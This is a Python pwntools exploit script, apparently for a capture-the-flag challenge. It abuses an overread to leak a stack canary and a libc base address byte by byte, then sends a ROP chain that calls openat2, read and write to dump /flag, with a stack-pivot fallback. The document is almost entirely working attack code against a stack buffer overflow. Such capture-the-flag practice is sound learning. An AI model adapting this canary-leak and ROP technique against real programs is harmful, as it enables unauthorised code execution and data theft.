from pwn import *
import time

# ensure 64-bit
context.update(arch='amd64', bits=64, endian='little', os='linux')
context.log_level = 'info'

p = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])

libc = ELF('./libc.so.6')
elf  = ELF('./chal')

# ----------------
# 1) leak 256 bytes (existing)
# ----------------
payload = b"A" * 104
idx = 104
target = b""

for i in range(256):
    p.recvuntil(b"What's your name?\n> ")
    p.send(payload)
    p.recvuntil(b"Your input is ")
    leak_line = p.recvline().strip()
    leak_byte = leak_line[idx:idx+1]
    target += (b"\x00" if leak_byte == b"" else leak_byte)
    p.recvuntil(b"Is this okay (Y/n) ?")
    p.sendline(b"n")
    idx += 1
    payload += b"C"

log.success(f"[+] Total leaked bytes ({len(target)}): {target.hex()}")

# show as addresses
for i in range(0, len(target), 8):
    chunk = target[i:i+8].ljust(8, b"\x00")
    addr = int.from_bytes(chunk, "little")
    log.info(f"  [{i:03d}-{i+7:03d}] {chunk.hex()} ADDR=0x{addr:016x}")

leak_canary = b"\x00" + target[105:112]
log.success(f"[+] Canary = {leak_canary.hex()}")

target_libc_main = target[104+16:104+16+8]
offset = libc.sym["__libc_start_main"]
leaked_addr = int.from_bytes(target_libc_main, "little")
libc_base = leaked_addr - offset
log.success(f"[+] libc base = {hex(libc_base)}")

# set base
libc.address = libc_base
log.info(f"[+] Set libc.address = {hex(libc.address)}")

# prepare rop finder on libc
rop = ROP(libc)

def gadget_addr(g):
    if g is None: return None
    if isinstance(g, int): return g
    for attr in ('address','addr'):
        if hasattr(g, attr):
            try:
                return int(getattr(g, attr))
            except Exception:
                pass
    try:
        return int(g)
    except Exception:
        return None

def find_any(seq_patterns):
    for seq in seq_patterns:
        try:
            g = rop.find_gadget(seq)
            if g:
                return g
        except Exception:
            pass
    return None

# find gadgets
g_pop_rax_obj = find_any([['pop rax','ret'], ['pop rax','nop','ret']])
g_pop_rdi_obj = find_any([['pop rdi','ret'], ['pop rdi','nop','ret']])
g_pop_rsi_obj = find_any([['pop rsi','ret'], ['pop rsi','pop r15','ret']])
g_pop_rdx_obj = find_any([['pop rdx','ret'], ['pop rdx','pop r12','ret']])
g_pop_r10_obj = find_any([['pop r10','ret']])
g_syscall_obj  = find_any([['syscall','ret'], ['syscall']])

# special composite gadget (pop rax; pop rdx; leave; ret) - user reported exists
g_pop_rax_pop_rdx_leave_obj = find_any([['pop rax','pop rdx','leave','ret'], ['pop rax','pop rdx','leave','nop','ret']])
# pop rbp ; ret (for pivot)
g_pop_rbp_obj = find_any([['pop rbp','ret'], ['pop rbp','nop','ret']])
# mov rdi, rax / xchg rax,rdi
g_mov_rdi_rax_obj = find_any([['mov rdi, rax','ret'], ['xchg rax, rdi','ret'], ['push rax','pop rdi','ret']])

g_pop_rax = gadget_addr(g_pop_rax_obj)
g_pop_rdi = gadget_addr(g_pop_rdi_obj)
g_pop_rsi = gadget_addr(g_pop_rsi_obj)
g_pop_rdx = gadget_addr(g_pop_rdx_obj)
g_pop_r10 = gadget_addr(g_pop_r10_obj)
g_syscall = gadget_addr(g_syscall_obj)
g_pop_rax_pop_rdx_leave = gadget_addr(g_pop_rax_pop_rdx_leave_obj)
g_pop_rbp = gadget_addr(g_pop_rbp_obj)
g_mov_rdi_rax = gadget_addr(g_mov_rdi_rax_obj)

log.info(f"gadgets: pop_rax={hex(g_pop_rax) if g_pop_rax else None} pop_rdi={hex(g_pop_rdi) if g_pop_rdi else None} pop_rsi={hex(g_pop_rsi) if g_pop_rsi else None}")
log.info(f"         pop_rdx={hex(g_pop_rdx) if g_pop_rdx else None} pop_r10={hex(g_pop_r10) if g_pop_r10 else None} syscall={hex(g_syscall) if g_syscall else None}")
log.info(f"special: pop_rax_pop_rdx_leave={hex(g_pop_rax_pop_rdx_leave) if g_pop_rax_pop_rdx_leave else None} pop_rbp={hex(g_pop_rbp) if g_pop_rbp else None} mov_rdi_rax={hex(g_mov_rdi_rax) if g_mov_rdi_rax else None}")

# verify essentials
if not (g_pop_rax and g_pop_rdi and g_pop_rsi and g_syscall):
    log.error("Essential gadgets missing (pop rax/pop rdi/pop rsi/syscall). Cannot continue.")
    exit(1)

# prepare .bss areas
bss = elf.bss() + 0x800
buf_path = bss                # write "/flag\x00" here & second-stage chain later
how_addr = bss + 0x40
buf_read = bss + 0x200
pivot_area = bss + 0x400     # pivot target (we will put small second-stage there)

read_size = 0x200

chain = b""
def emit_raw(addr, *vals):
    global chain
    if addr is None:
        log.error("emit_raw called with None")
        exit(1)
    chain += p64(addr)
    for v in vals:
        chain += p64(v & ((1<<64)-1))

# Two strategies:
# A) If pop rdx exists -> simple (set rdx directly)
# B) If pop rdx missing but pop_rax_pop_rdx_leave & pop_rbp exist -> pivot trick
use_pivot = False
if g_pop_rdx:
    log.info("[*] Using direct pop rdx path")
    # 1) read(0, buf_path, 8)
    emit_raw(g_pop_rax, 0)
    emit_raw(g_pop_rdi, 0)
    emit_raw(g_pop_rsi, buf_path)
    emit_raw(g_pop_rdx, 8)
    emit_raw(g_syscall)
    # 2) openat2 syscall
    SYS_openat2 = 437
    emit_raw(g_pop_rax, SYS_openat2)
    emit_raw(g_pop_rdi, (-100) & ((1<<64)-1))
    emit_raw(g_pop_rsi, buf_path)
    emit_raw(g_pop_rdx, how_addr)
    if g_pop_r10:
        emit_raw(g_pop_r10, 0x20)
    emit_raw(g_syscall)
    # 3) move rax->rdi or assume fd==3
    if g_mov_rdi_rax:
        emit_raw(g_mov_rdi_rax)
        emit_raw(g_pop_rsi, buf_read)
        emit_raw(g_pop_rdx, read_size)
        emit_raw(g_pop_rax, 0)
        emit_raw(g_syscall)
    else:
        log.warn("[!] No mov rdi,rax gadget: assuming fd==3")
        emit_raw(g_pop_rax, 0)
        emit_raw(g_pop_rdi, 3)
        emit_raw(g_pop_rsi, buf_read)
        emit_raw(g_pop_rdx, read_size)
        emit_raw(g_syscall)
    # 4) write
    emit_raw(g_pop_rax, 1)
    emit_raw(g_pop_rdi, 1)
    emit_raw(g_pop_rsi, buf_read)
    emit_raw(g_pop_rdx, read_size)
    emit_raw(g_syscall)
else:
    # pivot path
    if not (g_pop_rax_pop_rdx_leave and g_pop_rbp):
        log.error("pop rdx missing and pivot gadgets (pop_rax_pop_rdx_leave / pop_rbp) not available. Cannot continue.")
        exit(1)
    log.info("[*] Using pivot path via pop_rax; pop_rdx; leave; ret and pop rbp; ret")

    # We will place a small second-stage at pivot_area:
    # layout at pivot_area:
    #   [ new_rbp (qword) ]
    #   [ syscall_gadget ]   <-- will be ret-target
    # After pop_rax_pop_rdx_leave executes, rax & rdx set, leave sets rsp=pivot_addr and pop rbp; ret jumps to syscall gadget and syscall executes with registers configured.

    # Build small second-stage in .bss at pivot_area
    # new_rbp: set to 0 (or any)
    pivot_second_stage = p64(0x0) + p64(g_syscall)  # when ret jumps here it goes to syscall (using registers set earlier)
    # We'll write pivot_second_stage into payload after the main chain, because we can't write into bss yet.
    # So the trick: we will arrange pivot_area to point to payload stack address. To keep things simpler and reliable,
    # we will point pivot to buf_path (which we will fill by first read) + offset, *and* we will make the first read write both "/flag\x00" and the second-stage bytes into buf_path (single read).
    #
    # To do that, we set up:
    #   - rdi=0, rsi=buf_path, rax=SYS_read, rdx = 0x100  (set by pop_rax_pop_rdx_leave gadget)
    #   - pop rbp; ret sets rbp = pivot_addr (we choose pivot_addr = buf_path + 0x40) so after leave we pivot into data we just wrote
    #
    # So the chain will:
    #  - set pop rdi; rsi
    #  - pop rbp; ret (value pivot_addr)
    #  - pop_rax_pop_rdx_leave (vals: rax=0, rdx=0x100)
    # After this, kernel read(0, buf_path, 0x100) runs and writes both "/flag\x00" and our second-stage bytes at buf_path.
    #
    # Therefore we must also append the second-stage bytes to the *end of our final payload* (so when the kernel read writes into buf_path it overwrites that location — but read writes into buf_path in process memory, not into our sent bytes. So we must *send* enough bytes to satisfy the read AND also ensure pivot second-stage is present in memory at buf_path. Practically, we will send the bytes for read from the exploit after triggering the ROP (p.send(b"/flag\x00" + second_stage_bytes)).
    #
    # Build main chain that performs that initial read via pivot:
    # set rdi=0, rsi=buf_path, set rbp=pivot_addr, then invoke pop_rax_pop_rdx_leave with rax=SYS_read, rdx=0x100
    emit_raw(g_pop_rdi, 0)
    emit_raw(g_pop_rsi, buf_path)
    emit_raw(g_pop_rbp, buf_path + 0x40)   # pivot_addr
    # now the composite gadget: it will pop rax and rdx from the stack, then do leave; ret
    # we need to push rax and rdx values right after gadget address
    emit_raw(g_pop_rax_pop_rdx_leave, 0, 0x100)  # rax=SYS_read (we'll set rax=0), rdx=0x100
    # After leave, execution continues at pivot_addr+8, which should contain the address of syscall gadget (so read syscall executes)
    #
    # After that read finishes writing buf_path (we will send data), we need to execute openat2 → read(fd,...) → write.
    # We'll place the second-stage chain as data we send into stdin immediately after triggering ROP.
    # The second-stage bytes must be actual machine words representing the ROP instructions (addresses and values),
    # starting at pivot_addr: [new_rbp][syscall_gadget][...rest_of_stage...]
    #
    # Build second-stage chain (which will reside at buf_path, and be written there by our send)
    second_stage = b''
    # new rbp (we keep 0)
    second_stage += p64(0x0)
    # first ret target: go to syscall (this will execute the read syscall that we set up rax/rdi/rsi/rdx for)
    second_stage += p64(g_syscall)
    # After syscall returns, execution continues with whatever we put next in second_stage memory
    # Next we want to do openat2 syscall from second-stage. We'll craft sequence of qwords (addresses & immediates)
    # second_stage must contain addresses (gadgets) and immediates just like a normal chain.
    #
    # We'll append a full raw chain for openat2/read/write in second_stage, using the same gadget addresses (g_pop_rax etc).
    def append_stage_bytes(dst):
        b = b''
        # openat2:
        b += p64(g_pop_rax) + p64(437)                       # rax = SYS_openat2
        b += p64(g_pop_rdi) + p64((-100) & ((1<<64)-1))      # rdi = AT_FDCWD
        b += p64(g_pop_rsi) + p64(buf_path)                  # rsi = pathname (buf_path)
        if g_pop_rdx:
            b += p64(g_pop_rdx) + p64(how_addr)
        if g_pop_r10:
            b += p64(g_pop_r10) + p64(0x20)
        b += p64(g_syscall)
        # move rax->rdi or assume fd==3
        if g_mov_rdi_rax:
            b += p64(g_mov_rdi_rax)
            b += p64(g_pop_rsi) + p64(buf_read)
            if g_pop_rdx:
                b += p64(g_pop_rdx) + p64(read_size)
            b += p64(g_pop_rax) + p64(0)
            b += p64(g_syscall)
        else:
            # assume fd 3
            b += p64(g_pop_rax) + p64(0)
            b += p64(g_pop_rdi) + p64(3)
            b += p64(g_pop_rsi) + p64(buf_read)
            if g_pop_rdx:
                b += p64(g_pop_rdx) + p64(read_size)
            b += p64(g_syscall)
        # finally write
        b += p64(g_pop_rax) + p64(1)
        b += p64(g_pop_rdi) + p64(1)
        b += p64(g_pop_rsi) + p64(buf_read)
        if g_pop_rdx:
            b += p64(g_pop_rdx) + p64(read_size)
        b += p64(g_syscall)
        return b

    second_stage += append_stage_bytes(None)

    # We'll append second_stage bytes to the end of payload2 send (so when read(0,buf_path,0x100) executes,
    # the program will read exactly these bytes into buf_path and then pivoted syscall will execute them).
    extra_after_payload = second_stage
    use_pivot = True

# Build final payload2
payload2 = b"B" * 104
payload2 += leak_canary
payload2 += p64(0x0)  # fake rbp (we don't rely on this for pivot)
payload2 += chain

# send exploit
p.recvuntil(b"What's your name?\n> ")
p.send(payload2)
p.recvuntil(b"Is this okay (Y/n) ?")
p.sendline(b"Y")

# Now send the bytes for initial read (if pivot used, we must send /flag\x00 + second_stage; else just /flag)
if use_pivot:
    log.info("[*] Using pivot path: sending /flag and second-stage bytes for initial read")
    # initial read will read into buf_path; send "/flag\x00" + padding + second_stage
    data_for_read = b"/flag\x00"
    # pad to ensure second_stage starts at buf_path+0x40 (pivot address). We'll set pivot_address = buf_path+0x40 earlier.
    pad_len = 0x40 - len(data_for_read)
    if pad_len < 0: pad_len = 0
    data_for_read += b"\x00" * pad_len
    data_for_read += extra_after_payload
    p.send(data_for_read)
else:
    p.send(b"/flag\x00")

time.sleep(0.5)
out = p.recvrepeat(timeout=1)
print(out.decode(errors='ignore'))
p.interactive()

